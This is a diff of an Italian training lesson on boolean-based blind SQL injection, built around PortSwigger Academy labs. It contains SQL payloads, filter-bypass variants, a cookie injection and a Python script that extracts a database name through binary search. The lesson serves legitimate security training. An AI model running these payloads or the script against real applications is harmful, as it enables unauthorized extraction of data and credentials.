@@ -1,15 +1,15 @@
 # Blind SQLi (Boolean-Based)
 
-**Difficolta:** Advanced
+**Difficoltà:** Advanced
 **Time to Master:** 2.5h
 **Prerequisiti:** [03-Union-Based-SQLi.md](03-Union-Based-SQLi.md)
-**Lab:** PortSwigger Academy — Blind SQLi
+**Lab:** PortSwigger Academy: Blind SQLi
 
 ---
 
 ## Obiettivo
 
-Estrarre dati quando l'applicazione non mostra ne errori ne output diretto della query, ma il comportamento della pagina cambia (contenuto diverso, presenza/assenza di un elemento) in base alla veridicita di una condizione booleana iniettata.
+A volte l'app non ti dà niente: nessun errore, nessun dato in risposta, solo una pagina che sembra sempre identica. Ma se guardi bene, una differenza minima c'è — un elemento che compare o sparisce, un messaggio diverso — a seconda che la condizione booleana che hai iniettato sia vera o falsa. Da quel singolo bit di informazione, ripetuto migliaia di volte, estrai il database intero carattere per carattere.
 
 ---
 
@@ -49,7 +49,7 @@ Una volta identificato un differenziale osservabile, puoi porre domande booleane
 ```sql
 ' AND SUBSTRING(database(),1,1)='a' --
 ' AND SUBSTRING(database(),1,1)='b' --
-' AND ASCII(SUBSTRING(database(),1,1))>109 --   -- ricerca binaria, molto piu veloce
+' AND ASCII(SUBSTRING(database(),1,1))>109 --   -- ricerca binaria, molto più veloce
 ```
 
 **Spiegazione:** invece di provare ogni carattere in sequenza (lento), usa ricerca binaria sul valore ASCII: dimezzi il numero di richieste necessarie ad ogni step.
@@ -60,24 +60,35 @@ Una volta identificato un differenziale osservabile, puoi porre domande booleane
 import requests
 
 url = "http://target.com/product?id=1"
-result = ""
-for pos in range(1, 20):
-    low, high = 32, 126
+
+def binary_search(condition_template, low, high):
     while low < high:
         mid = (low + high) // 2
-        payload = f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid} --"
+        payload = condition_template(mid)
         r = requests.get(url, params={"id": payload})
         if "Welcome" in r.text:   # condizione "vera" osservata nell'app
             low = mid + 1
         else:
             high = mid
-    if low == 32:
-        break
-    result += chr(low)
+    return low
+
+# Step 1: lunghezza della stringa (più affidabile di un carattere "sentinella"
+# per capire quando fermarsi: uno spazio, es. ASCII 32, potrebbe far parte del dato reale)
+length = binary_search(
+    lambda mid: f"1' AND LENGTH(database())>{mid} --", 0, 100
+)
+
+result = ""
+for pos in range(1, length + 1):
+    code = binary_search(
+        lambda mid, pos=pos: f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid} --",
+        32, 126
+    )
+    result += chr(code)
     print(result)
 ```
 
-**Spiegazione:** questo script e la base di quello che sqlmap fa automaticamente; capirlo a fondo aiuta enormemente a interpretare e customizzare sqlmap quando serve un tamper particolare.
+**Spiegazione:** questo script è la base di quello che sqlmap fa automaticamente; capirlo a fondo aiuta enormemente a interpretare e customizzare sqlmap quando serve un tamper particolare. Estrarre prima `LENGTH()` invece di usare un carattere "sentinella" (es. fermarsi quando esce ASCII 32) evita di troncare il risultato se il dato reale contiene uno spazio.
 
 ### Esempio 4: blind boolean su cookie
 
@@ -90,7 +101,7 @@ Cookie: TrackingId=abc123' AND '1'='2
 
 ## Evasion / Bypass Techniques
 
-Se `SUBSTRING` e filtrato, usa alternative equivalenti:
+Se `SUBSTRING` è filtrato, usa alternative equivalenti:
 
 ```sql
 ' AND MID(database(),1,1)='a' --
@@ -101,7 +112,7 @@ Se `SUBSTRING` e filtrato, usa alternative equivalenti:
 
 ## Lab Hands-On
 
-### Lab 1: PortSwigger — Blind SQL injection with conditional responses
+### Lab 1: PortSwigger: Blind SQL injection with conditional responses
 **Obiettivo:** estrarre password admin carattere per carattere
 **Difficulty:** Difficile
 **Time:** 1h
@@ -115,14 +126,14 @@ Se `SUBSTRING` e filtrato, usa alternative equivalenti:
 
 ## Common Mistakes
 
-- Usare ricerca lineare invece che binaria -> molto piu lenta su stringhe lunghe (password hash)
-- Non verificare bene qual e il "differenziale" esatto tra vero/falso -> a volte e sottile (un singolo elemento HTML in piu/meno)
+- Usare ricerca lineare invece che binaria -> molto più lenta su stringhe lunghe (password hash)
+- Non verificare bene qual è il "differenziale" esatto tra vero/falso -> a volte è sottile (un singolo elemento HTML in più/meno)
 
 ---
 
 ## Link Utili
 
-- [PortSwigger — Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
+- [PortSwigger: Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)
 
 ---
 
@@ -140,8 +151,3 @@ Se `SUBSTRING` e filtrato, usa alternative equivalenti:
 - [ ] So implementare ricerca binaria per velocizzare l'estrazione
 - [ ] So automatizzare con Burp Intruder
 
----
-
-## Note personali
-
-_(spazio libero)_
